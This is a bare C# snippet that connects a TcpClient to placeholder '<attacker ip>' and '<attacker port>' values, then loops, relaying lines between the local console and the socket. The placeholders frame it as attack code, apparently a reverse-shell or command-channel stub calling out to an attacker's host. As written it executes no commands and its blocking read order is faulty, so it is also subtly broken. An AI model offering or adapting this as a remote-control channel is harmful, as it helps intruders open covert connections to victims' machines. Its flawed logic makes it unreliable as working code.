using System;
using System.Net.Sockets;
using System.IO;

TcpClient client = new TcpClient("<attacker ip>", <attacker port>);
NetworkStream nwStream = client.GetStream();
StreamReader reader = new StreamReader(nwStream);
StreamWriter writer = new StreamWriter(nwStream);

while (true) {
    string response = reader.ReadLine();
    string command = Console.ReadLine();
    writer.WriteLine(command);
    writer.Flush();
    Console.WriteLine(response);
}
